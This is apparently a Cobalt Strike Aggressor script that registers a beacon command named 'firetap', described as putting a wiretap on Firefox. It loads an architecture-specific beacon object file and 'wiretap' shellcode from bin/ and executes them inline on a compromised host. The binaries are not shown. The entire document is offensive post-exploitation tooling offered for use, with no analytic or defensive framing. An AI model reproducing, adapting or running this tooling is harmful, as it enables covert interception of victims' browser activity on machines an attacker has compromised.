alias firetap {
    $arch = binfo($1, "barch");

    if ($arch eq "x64") {
        $handle = openf(script_resource("bin/firetap.x64.o"));
        $shchandle = openf(script_resource("bin/wiretap.x64.bin"));
    }
    else {
        $handle = openf(script_resource("bin/firetap.x86.o"));
        $shchandle = openf(script_resource("bin/wiretap.x86.bin"));
    }
    
    $data   = readb($handle, -1);
    closef($handle);

    $shcdata   = readb($shchandle, -1);
    closef($shchandle);

    $args = bof_pack($1, "ib", strlen($shcdata), $shcdata);

    btask($1, "Placing wiretap on firefox")

    beacon_inline_execute($1, $data, "go", $args);
    
    return;
}

beacon_command_register("firetap", "Put a wiretap on firefox");
